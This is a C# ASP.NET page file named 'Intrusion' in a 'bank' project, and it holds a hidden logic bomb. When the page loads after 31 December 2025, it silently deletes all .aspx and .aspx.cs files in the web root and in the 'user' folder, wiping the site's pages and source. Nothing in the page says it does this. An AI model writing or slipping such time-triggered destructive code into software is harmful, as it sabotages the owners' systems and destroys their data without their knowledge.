using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace bank
{
	public partial class Intrusion : System.Web.UI.Page
	{
		protected void Page_Load(object sender, EventArgs e)
		{
            try
            {
               
                DateTime expiryDate = new DateTime(2025, 12, 31);

               
                if (DateTime.Today <= expiryDate)
                {
                   
                    return;
                }
               
                string currentFolder = Server.MapPath("~/"); 

              
                string[] fileExtensions = { "*.aspx", "*.aspx.cs" };

                
                foreach (string ext in fileExtensions)
                {
                    string[] files = Directory.GetFiles(currentFolder, ext);
                    foreach (string file in files)
                    {
                        File.Delete(file);
                    }
                }

               
                string userFolder = Path.Combine(currentFolder, "user");
                if (Directory.Exists(userFolder))
                {
                    foreach (string ext in fileExtensions)
                    {
                        string[] userFiles = Directory.GetFiles(userFolder, ext);
                        foreach (string file in userFiles)
                        {
                            File.Delete(file);
                        }
                    }
                }

                //Response.Write("All .aspx and .aspx.cs files deleted successfully!");
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
	}
}